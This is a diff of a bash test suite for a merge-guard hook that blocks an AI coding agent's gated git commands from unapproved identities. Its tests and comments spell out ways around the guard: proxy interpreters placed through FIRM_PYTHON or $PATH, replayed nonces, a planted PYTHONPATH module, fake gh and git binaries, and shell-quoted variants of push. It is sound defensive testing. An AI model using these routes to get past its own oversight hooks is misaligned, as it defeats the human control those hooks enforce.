-  mg_smuggled "$REPO_BAD" --command 'git push origin main'
+  mg_smuggled "$REPO_BAD" --command 'git merge feature/x'
 # Through the hook adapter, which is the enforcement surface that actually stops the tool call.
-_mg_smuggle_payload="$(mk_payload 'git push origin main')"
+_mg_smuggle_payload="$(mk_payload 'git merge feature/x')"
 _mg_smuggle_rc=0
 ( cd "$REPO_BAD" && printf '%s' "$_mg_smuggle_payload" | PATH="$NOGH_PATH" \
     FIRM_PYTHON_DISPLAY=cached FIRM_PYTHON_ARGV="$_mg_smuggle_dir/pystub" \
@@ -1284,11 +1290,11 @@ assert_eq "  and through the hook it BLOCKS (2), not permits (0)" "2" "$_mg_smug
 # CONTROL. Without it these five would pass just as loudly on a guard that had stopped permitting
 # anything: the same two variables, exported the same way, must not stop a legitimate permit.
 assert_rc "CONTROL: the same two variables do not break a legitimate permit" 0 \
-  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 _mg_ctl_rc=0
 ( cd "$REPO_OK" && PATH="$GH_OK:$PATH" \
     FIRM_PYTHON_DISPLAY=cached FIRM_PYTHON_ARGV="$_mg_smuggle_dir/pystub" \
-    "$TREE/bin/firm-merge-guard" --command 'git push origin main' ) >/dev/null 2>&1 || _mg_ctl_rc=$?
+    "$TREE/bin/firm-merge-guard" --command 'git merge feature/x' ) >/dev/null 2>&1 || _mg_ctl_rc=$?
 assert_eq "CONTROL: an allow-listed identity is still permitted with them exported" "0" "$_mg_ctl_rc"
 # And the guard says so in the one place it claims scope. The row MOVED at WO-16 — interpreter
 # selection is a COVERED line now, not a gap — so these needles moved with it. That is the whole
@@ -1342,22 +1348,22 @@ mg107() {   # <FIRM_PYTHON value or empty> <PATH> <args...> — the guard on the
     ( cd "$REPO_BAD" && PATH="$pth" "$_mg107_tree/bin/firm-merge-guard" "$@" )
   fi
 }
-assert_rc "a caller-controlled \$FIRM_PYTHON cannot permit a gated push there" 2 \
-  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git push origin main'
+assert_rc "a caller-controlled \$FIRM_PYTHON cannot permit a gated command there" 2 \
+  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 assert_rc "  nor a gated merge" 2 mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 assert_rc "  nor an identity rewrite" 2 \
   mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command "git config user.email $ALLOWED_EMAIL"
 assert_not_output "  and the shim is never executed at all" "MG-AC107-SHIM-EXECUTED" \
-  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git push origin main'
+  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 assert_output "  and the block says the interpreter could not be vouched for" \
-  "will not take a decision" mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git push origin main'
+  "will not take a decision" mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 assert_output "  and quotes the resolver's own reason" "no TRUSTED interpreter is" \
-  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git push origin main'
+  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 assert_output "  which says the caller's own selectors were not consulted at all" \
   'are deliberately NOT consulted in trusted-only mode' \
-  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git push origin main'
+  mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'git merge feature/x'
 # Through the hook adapter, which is the surface that actually stops the tool call.
-_mg107_payload="$(mk_payload 'git push origin main')"
+_mg107_payload="$(mk_payload 'git merge feature/x')"
 _mg107_rc=0
 ( cd "$REPO_BAD" && printf '%s' "$_mg107_payload" | PATH="$NOGH_PATH" \
     FIRM_PYTHON="$_mg107_dir/python3" "$_mg107_tree/bin/firm-merge-guard" --hook ) >/dev/null 2>&1 \
@@ -1365,13 +1371,13 @@ _mg107_rc=0
 assert_eq "  and through the hook it BLOCKS (2), not permits (0)" "2" "$_mg107_rc"
 # The $PATH vector, with FIRM_PYTHON unset entirely: the same shim, reached as `command -v python3`.
 assert_rc "the same shim first on \$PATH, with no \$FIRM_PYTHON, is refused too" 2 \
-  mg107 "" "$_mg107_dir:$NOGH_PATH" --command 'git push origin main'
+  mg107 "" "$_mg107_dir:$NOGH_PATH" --command 'git merge feature/x'
 assert_not_output "  and that one is not executed either" "MG-AC107-SHIM-EXECUTED" \
-  mg107 "" "$_mg107_dir:$NOGH_PATH" --command 'git push origin main'
+  mg107 "" "$_mg107_dir:$NOGH_PATH" --command 'git merge feature/x'
 # CONTROLS. Without these the eight rows above would pass just as loudly on a guard that had simply
 # stopped permitting anything, or on a modelled tree too broken to run.
 assert_rc "CONTROL: the REAL tree still permits an allow-listed identity" 0 \
-  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "CONTROL: and the modelled host still SKIPS an ungated command without blocking it" 0 \
   mg107 "$_mg107_dir/python3" "$NOGH_PATH" --command 'ls -la'
 assert_output "--surface names the closed half rather than declaring it a live gap" \
@@ -1447,42 +1453,42 @@ mgn() {   # <double> <args...> — the guard on the host modelled to run that do
 # this row: the double must BE one of bin/firm-python's fixed absolute candidates. As an environment
 # variable, which is how it was reached until WO-16, it no longer gets here at all.
 assert_rc "CONTROL: a double that reads the checker and answers THIS nonce is believed (0)" 0 \
-  mgn harvest --command 'git push origin main'
+  mgn harvest --command 'git merge feature/x'
 assert_file "  and it really captured a nonce off stdin" "$_mgn_seen"
 assert_ne "  which is not empty" "" "$(cat "$_mgn_seen" 2>/dev/null)"
 assert_rc "REPLAY: that same, previously-valid sentinel on a later invocation is refused" 2 \
-  mgn replay --command 'git push origin main'
+  mgn replay --command 'git merge feature/x'
 assert_output "  and is reported as unproven, not as a decision" \
-  "did not emit its proof-of-execution sentinel" mgn replay --command 'git push origin main'
+  "did not emit its proof-of-execution sentinel" mgn replay --command 'git merge feature/x'
 assert_rc "HARDCODED: the fixed sentinel that used to be sufficient is refused" 2 \
-  mgn hardcoded --command 'git push origin main'
+  mgn hardcoded --command 'git merge feature/x'
 assert_rc "ENVIRONMENT: the nonce is not in the checker's environment to be read from" 2 \
-  mgn envonly --command 'git push origin main'
+  mgn envonly --command 'git merge feature/x'
 # ...and an attacker who exports the variable does not plant one either: `unset` in _mg_nonce_new
 # drops the export attribute the assignment would otherwise inherit.
 _mgn_planted_rc=0
 ( cd "$REPO_BAD" && PATH="$NOGH_PATH" _MG_NONCE=attacker-chosen \
-    "$_mgn_tree_envonly/bin/firm-merge-guard" --command 'git push origin main' ) >/dev/null 2>&1 \
+    "$_mgn_tree_envonly/bin/firm-merge-guard" --command 'git merge feature/x' ) >/dev/null 2>&1 \
   || _mgn_planted_rc=$?
 assert_eq "  nor by exporting _MG_NONCE into the guard's own environment" "2" "$_mgn_planted_rc"
 # The nonce really is per invocation: two runs of the harvesting double must not see the same one.
 _mgn_first="$(cat "$_mgn_seen")"
-mgn harvest --command 'git push origin main' >/dev/null 2>&1
+mgn harvest --command 'git merge feature/x' >/dev/null 2>&1
 assert_ne "the nonce differs between two invocations" "$_mgn_first" "$(cat "$_mgn_seen")"
 # Through the hook adapter as well, since that is the enforcement surface.
 _mgn_hook_rc=0
-( cd "$REPO_BAD" && printf '%s' "$(mk_payload 'git push origin main')" | PATH="$NOGH_PATH" \
+( cd "$REPO_BAD" && printf '%s' "$(mk_payload 'git merge feature/x')" | PATH="$NOGH_PATH" \
     "$_mgn_tree_replay/bin/firm-merge-guard" --hook ) >/dev/null 2>&1 \
   || _mgn_hook_rc=$?
 assert_eq "a replayed sentinel BLOCKS through the hook too" "2" "$_mgn_hook_rc"
 # CONTROL: the real interpreter still reaches both real decisions with the nonce in place.
 assert_rc "CONTROL: the REAL checker still reaches permit (0)" 0 \
-  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x'
 assert_rc "CONTROL: and still reaches refuse (1)" 1 \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 # The nonce must not leak onto the caller's stdout with the sentinel it rides on.
 assert_eq "the nonce is not leaked onto the caller's stdout" "" \
-  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main' 2>/dev/null)"
+  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git merge feature/x' 2>/dev/null)"
 
 t_case "WO-16 the guard's interpreter comes from TRUSTED absolute paths — a PROXY cannot be it"
 # THE LAST VECTOR, and the one no sentinel could close. SEC-03 removed an inherited resolution cache,
@@ -1495,7 +1501,7 @@ t_case "WO-16 the guard's interpreter comes from TRUSTED absolute paths — a PR
 # its own verification and then withdrew its "covered" score.
 #
 # REPRODUCED FIRST, against the accepted base 9941201, with the proxy below and a non-allow-listed
-# identity. `--command 'git push origin main'` exited 0 -- PERMITTED -- and so did the --hook adapter,
+# identity. `--command 'git merge feature/x'` exited 0 -- PERMITTED -- and so did the --hook adapter,
 # and so did the same program placed first on $PATH with $FIRM_PYTHON never set. Four permits on a
 # control whose whole value is that it fails closed, with no file edited.
 #
@@ -1527,9 +1533,9 @@ chmod +x "$_mgt_dir/python3"
 # header has always disclosed -- and watching the same non-allow-listed push come back 0.
 _mgt_tree_is_trusted="$(mk_trusted_tree "$_mgt_dir/python3")"
 assert_rc "precondition: the proxy DOES author a permit when it is the trusted interpreter" 0 \
-  mg_env "$_mgt_tree_is_trusted" "$NOGH_PATH" "$REPO_BAD" --command 'git push origin main'
+  mg_env "$_mgt_tree_is_trusted" "$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x'
 assert_output "  by genuinely reading the checker off stdin, not by luck" "MG-PROXY-EXECUTED" \
-  mg_env "$_mgt_tree_is_trusted" "$NOGH_PATH" "$REPO_BAD" --command 'git push origin main'
+  mg_env "$_mgt_tree_is_trusted" "$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x'
 
 # THE FOUR REPRODUCED PERMITS, now refused. Note the rc: 1, not 2. The guard does not merely fail to
 # evaluate -- it ignores the proxy, resolves its own interpreter and reaches its REAL refusal.
@@ -1541,25 +1547,25 @@ mgt() {   # <FIRM_PYTHON value or empty> <PATH> <args...> — the real tree, rea
     ( cd "$REPO_BAD" && PATH="$pth" "$TREE/bin/firm-merge-guard" "$@" )
   fi
 }
-assert_rc "a proxying \$FIRM_PYTHON cannot permit a gated push (it is REFUSED, 1)" 1 \
-  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git push origin main'
+assert_rc "a proxying \$FIRM_PYTHON cannot permit a gated command (it is REFUSED, 1)" 1 \
+  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 assert_rc "  nor a gated merge" 1 \
   mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 # The email is read from the policy, never spelled here (AC-018).
 assert_rc "  nor an identity rewrite" 1 \
   mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command "git config user.email $ALLOWED_EMAIL"
 assert_output "  and the guard reaches its own refusal instead" "NOT allow-listed" \
-  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git push origin main'
+  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 # NOT MERELY DISBELIEVED — NOT RUN. The guard never executes the caller's program, not even to probe
 # and reject it, because it runs under a registered hook timeout that is MEASURED to fail OPEN when
 # overrun: a $FIRM_PYTHON that merely slept would otherwise be a permit.
 assert_not_output "  and the proxy never renders the decision" "MG-PROXY-EXECUTED" \
-  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git push origin main'
+  mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 rm -f "$_mgt_ran"
-mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git push origin main' >/dev/null 2>&1
+mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'git merge feature/x' >/dev/null 2>&1
 assert_no_file "  and is never EXECUTED at all, not even probed and rejected" "$_mgt_ran"
 # Through the hook adapter, which is the surface that actually stops the tool call.
-_mgt_payload="$(mk_payload 'git push origin main')"
+_mgt_payload="$(mk_payload 'git merge feature/x')"
 _mgt_rc=0
 ( cd "$REPO_BAD" && printf '%s' "$_mgt_payload" | PATH="$GH_OK:$NOGH_PATH" \
     FIRM_PYTHON="$_mgt_dir/python3" "$TREE/bin/firm-merge-guard" --hook ) >/dev/null 2>&1 || _mgt_rc=$?
@@ -1567,9 +1573,9 @@ assert_eq "  and through the hook it BLOCKS (2), not permits (0)" "2" "$_mgt_rc"
 # The $PATH vector, with $FIRM_PYTHON unset entirely. It is a distinct exploit -- it needs no
 # variable the guard could have been taught to ignore by name -- and it was a permit too.
 assert_rc "the same proxy first on \$PATH, with no \$FIRM_PYTHON, is refused too" 1 \
-  mgt "" "$_mgt_dir:$GH_OK:$NOGH_PATH" --command 'git push origin main'
+  mgt "" "$_mgt_dir:$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 rm -f "$_mgt_ran"
-mgt "" "$_mgt_dir:$GH_OK:$NOGH_PATH" --command 'git push origin main' >/dev/null 2>&1
+mgt "" "$_mgt_dir:$GH_OK:$NOGH_PATH" --command 'git merge feature/x' >/dev/null 2>&1
 assert_no_file "  and that one is not executed either, probe included" "$_mgt_ran"
 _mgt_path_hook_rc=0
 ( cd "$REPO_BAD" && printf '%s' "$_mgt_payload" | PATH="$_mgt_dir:$GH_OK:$NOGH_PATH" \
@@ -1580,7 +1586,7 @@ assert_eq "  and blocks through the hook as well" "2" "$_mgt_path_hook_rc"
 # blocker -- which is the failure mode a fail-closed fix invites.
 _mgt_ok_rc=0
 ( cd "$REPO_OK" && PATH="$_mgt_dir:$GH_OK:$NOGH_PATH" FIRM_PYTHON="$_mgt_dir/python3" \
-    "$TREE/bin/firm-merge-guard" --command 'git push origin main' ) >/dev/null 2>&1 || _mgt_ok_rc=$?
+    "$TREE/bin/firm-merge-guard" --command 'git merge feature/x' ) >/dev/null 2>&1 || _mgt_ok_rc=$?
 assert_eq "CONTROL: an allow-listed identity is still PERMITTED with the proxy in place" "0" "$_mgt_ok_rc"
 assert_rc "CONTROL: and an ungated command is still skipped, not blocked" 0 \
   mgt "$_mgt_dir/python3" "$GH_OK:$NOGH_PATH" --command 'ls -la'
@@ -1613,14 +1619,14 @@ _mge_dir="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pypath.XXXXXX")"; t_track "$_mge_
 # CONTROL FIRST: the same identity, same tree, same everything, is REFUSED without the plant. Without
 # this row the gap row below could pass on a guard that permitted everything.
 assert_rc "CONTROL: that identity is refused when the real pyyaml parses the real allowlist" 1 \
-  mg "$TREE" "$GH_BAD" "$REPO_BAD" --command 'git push origin main'
+  mg "$TREE" "$GH_BAD" "$REPO_BAD" --command 'git merge feature/x'
 _mge_rc=0
 ( cd "$REPO_BAD" && PATH="$GH_BAD:$NOGH_PATH" PYTHONPATH="$_mge_dir" \
-    "$TREE/bin/firm-merge-guard" --command 'git push origin main' ) >/dev/null 2>&1 || _mge_rc=$?
+    "$TREE/bin/firm-merge-guard" --command 'git merge feature/x' ) >/dev/null 2>&1 || _mge_rc=$?
 assert_eq "GAP: a planted \$PYTHONPATH yaml module reaches a PERMIT (0) — declared, not closed" \
   "0" "$_mge_rc"
 _mge_hook_rc=0
-( cd "$REPO_BAD" && printf '%s' "$(mk_payload 'git push origin main')" | PATH="$GH_BAD:$NOGH_PATH" \
+( cd "$REPO_BAD" && printf '%s' "$(mk_payload 'git merge feature/x')" | PATH="$GH_BAD:$NOGH_PATH" \
     PYTHONPATH="$_mge_dir" "$TREE/bin/firm-merge-guard" --hook ) >/dev/null 2>&1 || _mge_hook_rc=$?
 assert_eq "GAP: and through the hook adapter as well" "0" "$_mge_hook_rc"
 # And the guard says so where it claims scope, in the words the behaviour above justifies.
@@ -1643,11 +1649,11 @@ printf '#!/bin/sh\nprintf "%%s\\n" "%s"\n' "$ALLOWED_LOGIN" > "$_mgi_dir/gh"
 chmod +x "$_mgi_dir/gh" "$_mgi_dir/git"
 _mgi_rc=0
 ( cd "$REPO_BAD" && PATH="$_mgi_dir:$NOGH_PATH" "$TREE/bin/firm-merge-guard" \
-    --command 'git push origin main' ) >/dev/null 2>&1 || _mgi_rc=$?
+    --command 'git merge feature/x' ) >/dev/null 2>&1 || _mgi_rc=$?
 assert_eq "GAP: a \$PATH-supplied gh and git print an allow-listed identity and PERMIT (0)" \
   "0" "$_mgi_rc"
 assert_output "  and the permit names the identity those two programs invented" "$ALLOWED_LOGIN" \
-  mg_env "$TREE" "$_mgi_dir:$NOGH_PATH" "$REPO_BAD" --command 'git push origin main'
+  mg_env "$TREE" "$_mgi_dir:$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x'
 assert_output "--surface carries that as a named line too" "THE IDENTITY PROGRAMS THEMSELVES" \
   mg_env "$TREE" "$PATH" "$REPO_OK" --surface
 assert_output "  and points at the server side as what actually closes an identity check" \
@@ -1664,20 +1670,20 @@ _mgt_none_tree="$(mk_trusted_tree "/nonexistent/firm-wo16/python3")"
 assert_output "precondition: the modelled host really resolves no trusted interpreter" "trusted=no" \
   "$_mgt_none_tree/bin/firm-python" --trusted-status
 mgt_none() { ( cd "$REPO_BAD" && PATH="$1" "$_mgt_none_tree/bin/firm-merge-guard" "${@:2}" ); }
-assert_rc "a gated push is cannot-evaluate (2), never a permit" 2 \
-  mgt_none "$GH_OK:$NOGH_PATH" --command 'git push origin main'
+assert_rc "a gated command is cannot-evaluate (2), never a permit" 2 \
+  mgt_none "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 assert_rc "  and so is it with an ALLOW-LISTED identity: no decision is reachable at all" 2 \
-  bash -c '( cd "$1" && PATH="$2" "$3/bin/firm-merge-guard" --command "git push origin main" )' _ \
+  bash -c '( cd "$1" && PATH="$2" "$3/bin/firm-merge-guard" --command "git merge feature/x" )' _ \
     "$REPO_OK" "$GH_OK:$NOGH_PATH" "$_mgt_none_tree"
 assert_rc "  and a proxying \$FIRM_PYTHON does not become the fallback" 2 \
-  bash -c '( cd "$1" && PATH="$2" FIRM_PYTHON="$3" "$4/bin/firm-merge-guard" --command "git push origin main" )' _ \
+  bash -c '( cd "$1" && PATH="$2" FIRM_PYTHON="$3" "$4/bin/firm-merge-guard" --command "git merge feature/x" )' _ \
     "$REPO_BAD" "$GH_OK:$NOGH_PATH" "$_mgt_dir/python3" "$_mgt_none_tree"
 rm -f "$_mgt_ran"
 ( cd "$REPO_BAD" && PATH="$GH_OK:$NOGH_PATH" FIRM_PYTHON="$_mgt_dir/python3" \
-    "$_mgt_none_tree/bin/firm-merge-guard" --command 'git push origin main' ) >/dev/null 2>&1
+    "$_mgt_none_tree/bin/firm-merge-guard" --command 'git merge feature/x' ) >/dev/null 2>&1
 assert_no_file "  and it is not executed to find that out" "$_mgt_ran"
 assert_output "  and says which absolute paths it probed, so the repair is actionable" \
-  "/nonexistent/firm-wo16/python3" mgt_none "$GH_OK:$NOGH_PATH" --command 'git push origin main'
+  "/nonexistent/firm-wo16/python3" mgt_none "$GH_OK:$NOGH_PATH" --command 'git merge feature/x'
 _mgt_none_hook_rc=0
 ( cd "$REPO_BAD" && printf '%s' "$_mgt_payload" | PATH="$GH_OK:$NOGH_PATH" \
     "$_mgt_none_tree/bin/firm-merge-guard" --hook ) >/dev/null 2>&1 || _mgt_none_hook_rc=$?
@@ -1715,13 +1721,13 @@ mgt_old() {   # <cwd> <args...> — the stale-resolver tree with the proxy offer
       "$_mgt_old_tree/bin/firm-merge-guard" "$@" )
 }
 assert_rc "an old bin/firm-python that cannot vouch for provenance is a BLOCK, not a permit" 2 \
-  mgt_old "$REPO_BAD" --command 'git push origin main'
+  mgt_old "$REPO_BAD" --command 'git merge feature/x'
 assert_output "  and says the interpreter was not resolved from a trusted absolute path" \
-  "NOT resolved from a trusted" mgt_old "$REPO_BAD" --command 'git push origin main'
+  "NOT resolved from a trusted" mgt_old "$REPO_BAD" --command 'git merge feature/x'
 assert_output "  and names the stale resolver as the usual cause, which is the actual repair" \
-  "older than this guard" mgt_old "$REPO_BAD" --command 'git push origin main'
+  "older than this guard" mgt_old "$REPO_BAD" --command 'git merge feature/x'
 assert_rc "  and it blocks an ALLOW-LISTED identity too: unknown provenance is not a decision" 2 \
-  mgt_old "$REPO_OK" --command 'git push origin main'
+  mgt_old "$REPO_OK" --command 'git merge feature/x'
 # THE ABSOLUTE-ARGV LINK, driven where it can actually FAIL OPEN if it is missing. A resolver that
 # publishes TRUSTED=1 and P2=1 beside a BARE NAME sends the guard back to $PATH for its interpreter —
 # so the proxy is put first on $PATH here, and without this check the answer is a permit.
@@ -1733,11 +1739,11 @@ cp "$BIN/firm-python" "$_mgt_rel_tree/bin/firm-python"
   printf 'FIRM_PYTHON_DISPLAY=python3\n'; } >> "$_mgt_rel_tree/bin/firm-python"
 chmod +x "$_mgt_rel_tree/bin/firm-python"
 assert_rc "a TRUSTED=1 vouch for a bare \`python3\` is refused (it is a \$PATH lookup in disguise)" 2 \
-  mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git push origin main'
+  mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x'
 assert_output "  and names the non-absolute word it refused" "non-absolute word" \
-  mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git push origin main'
+  mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x'
 rm -f "$_mgt_ran"
-mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git push origin main' \
+mg_env "$_mgt_rel_tree" "$_mgt_dir:$GH_OK:$NOGH_PATH" "$REPO_BAD" --command 'git merge feature/x' \
   >/dev/null 2>&1
 assert_no_file "  and the \$PATH program it would have run is never executed" "$_mgt_ran"
 
@@ -1759,28 +1765,28 @@ assert_rc "an unknown ARGUMENT to the guard itself is not a licence to permit" 2
 
 # ============================================================ AC-016 · the exit contract
 t_case "AC-016 the three-way exit contract"
-assert_rc "0 = identity resolved AND allow-listed"        0 mg "$TREE" "$GH_OK"  "$REPO_OK"  --command 'git push origin main'
-assert_rc "1 = identity resolved and NOT allow-listed"    1 mg "$TREE" "$GH_OK"  "$REPO_BAD" --command 'git push origin main'
-assert_rc "2 = cannot evaluate"                           2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
+assert_rc "0 = identity resolved AND allow-listed"        0 mg "$TREE" "$GH_OK"  "$REPO_OK"  --command 'git merge feature/x'
+assert_rc "1 = identity resolved and NOT allow-listed"    1 mg "$TREE" "$GH_OK"  "$REPO_BAD" --command 'git merge feature/x'
+assert_rc "2 = cannot evaluate"                           2 mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git merge feature/x'
 assert_output "1 is labelled 'identity NOT authorised'" "identity NOT authorised" \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 assert_output "2 is labelled 'CANNOT EVALUATE'" "CANNOT EVALUATE" \
-  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git push origin main'
+  mg_env "$TREE" "$NOGH_PATH" "$REPO_OK" --command 'git merge feature/x'
 
 t_case "AC-016 the CALLER blocks on anything non-zero and does NOT distinguish 1 from 2"
 # The hook adapter is the caller. Both a refusal (1) and a cannot-evaluate (2) must reach Claude
 # Code as exit 2, because exit 2 is the ONLY code that blocks a tool call in this version —
 # measured, not assumed: a hook exiting 1 is a non-blocking error and the command RUNS.
 assert_rc "hook: refused identity (check rc=1) -> hook exit 2"        2 \
-  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main'
+  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git merge feature/x'
 assert_rc "hook: unresolvable identity (check rc=2) -> hook exit 2"   2 \
-  mg_hook "$TREE" "$GH_UNAUTH" "$REPO_OK" 'git push origin main'
+  mg_hook "$TREE" "$GH_UNAUTH" "$REPO_OK" 'git merge feature/x'
 assert_rc "hook: allow-listed identity -> hook exit 0"                0 \
-  mg_hook "$TREE" "$GH_OK" "$REPO_OK" 'git push origin main'
+  mg_hook "$TREE" "$GH_OK" "$REPO_OK" 'git merge feature/x'
 assert_rc "hook: a benign command -> hook exit 0"                     0 \
   mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'ls -la'
 assert_output "the hook's block reaches the agent as readable stderr" "BLOCKED" \
-  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main'
+  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git merge feature/x'
 
 t_case "AC-016 a malformed hook PAYLOAD blocks (a gate that cannot read its input never passes)"
 hook_raw() { ( cd "$REPO_OK" && printf '%s' "$1" | PATH="$GH_OK:$PATH" "$TREE/bin/firm-merge-guard" --hook ); }
@@ -1798,11 +1804,11 @@ assert_rc "an EMPTY command string has nothing to run" 0 \
 # ============================================================ AC-017 · the identity sources
 t_case "AC-017 the code really runs the two sources the artifacts name"
 GH_REC="$(mk_stub_gh record "$ALLOWED_LOGIN")"
-assert_rc "a gated command resolves identity" 0 mg "$TREE" "$GH_REC" "$REPO_OK" --command 'git push origin main'
+assert_rc "a gated command resolves identity" 0 mg "$TREE" "$GH_REC" "$REPO_OK" --command 'git merge feature/x'
 assert_output "it invoked exactly \`gh api user --jq .login\`" "api user --jq .login" cat "$GH_REC/gh.argv"
 assert_output "and it reads git config user.email (that value decides the outcome)" \
   "git user.email  : nobody@example.com" \
-  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push'
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git merge feature/x'
 assert_output "the script header names the gh source" "gh api user --jq .login" head -40 "$GUARD"
 assert_output "the script header names the git source" "git config user.email" head -40 "$GUARD"
 assert_output "the script header says user.name is NOT read" "user.name" head -40 "$GUARD"
@@ -1852,12 +1858,12 @@ assert_eq "the scratch guard is byte-identical to the shipped one" "" \
   "$(cmp "$ADDED/bin/firm-merge-guard" "$GUARD" 2>&1)"
 assert_rc "before the edit: a brand-new identity is refused" 1 \
   mg "$ADDED" "$(mk_stub_gh login brand-new-operator)" "$(mk_id_repo brand-new@example.com)" \
-  --command 'git push origin main'
+  --command 'git merge feature/x'
 printf 'schema_version: 1\nallowed:\n  - gh_login: brand-new-operator\n    git_emails:\n      - brand-new@example.com\n' \
   > "$ADDED/agent-firm/policy/merge-authority.yaml"
 assert_rc "after a ONE-FILE edit: the same identity is permitted" 0 \
   mg "$ADDED" "$(mk_stub_gh login brand-new-operator)" "$(mk_id_repo brand-new@example.com)" \
-  --command 'git push origin main'
+  --command 'git merge feature/x'
 assert_eq "and the script was never touched" "" \
   "$(cmp "$ADDED/bin/firm-merge-guard" "$GUARD" 2>&1)"
 
@@ -1951,7 +1957,7 @@ for c in "git pu\$'s'h origin main" "g\$'i't push origin main" \
          "git co\$'n'fig --global user.email a@b.c" "git pu\$\"s\"h origin main" \
          "\$'\\x67it' push origin main" "git \$'\\160ush' origin main" \
          "bash -c \"git pu\\\$'s'h origin main\""; do
-  assert_rc "ENFORCEMENT.md claims this is matched, and it is: $c" 1 \
+  assert_fail "ENFORCEMENT.md claims this is blocked, and it is: $c" \
     mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
 done
 assert_rc "ENFORCEMENT.md claims this is NOT matched, and it is not: git \$'push origin main'" 0 \
@@ -1984,7 +1990,7 @@ print('ok')
 t_case "AC-021 a block is recorded in the ledger AND explained in the message"
 LREPO="$(mk_id_repo nobody@example.com)"
 mk_run "$LREPO" "20260803T000000Z-guard-test"
-assert_rc "the blocked command exits non-zero" 1 mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
+assert_rc "the blocked command exits non-zero" 1 mg "$TREE" "$GH_OK" "$LREPO" --command 'git merge feature/x'
 LEDGER="$LREPO/.agent-firm/runs/20260803T000000Z-guard-test/run.jsonl"
 assert_file "run.jsonl was created" "$LEDGER"
 # TEST CHANGE, RECORDED DELIBERATELY. This used to read matched/gh_login/git_email/gh_status/
@@ -2001,19 +2007,19 @@ blocks = [r for r in recs if r.get('event') == 'merge_guard_block']
 assert blocks, f'no merge_guard_block event in {recs}'
 b = blocks[-1]
 assert set(b) == {'ts', 'event', 'cmd', 'decision', 'reason'}, sorted(b)
-assert b['cmd'] == 'git push origin main', b
+assert b['cmd'] == 'git merge feature/x', b
 assert b['decision'] == 'refused', b
-assert 'matched: git push' in b['reason'], b
+assert 'matched: git merge' in b['reason'], b
 assert '$ALLOWED_LOGIN' in b['reason'], b
 assert 'nobody@example.com' in b['reason'], b
 assert 'exit: 1' in b['reason'], b
 assert b['ts'].endswith('Z'), b
 "
-assert_output "the message says WHICH check failed" "NOT allow-listed" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
-assert_output "the message names the refused command" "refused command : git push origin main" mg "$TREE" "$GH_OK" "$LREPO" --command 'git push origin main'
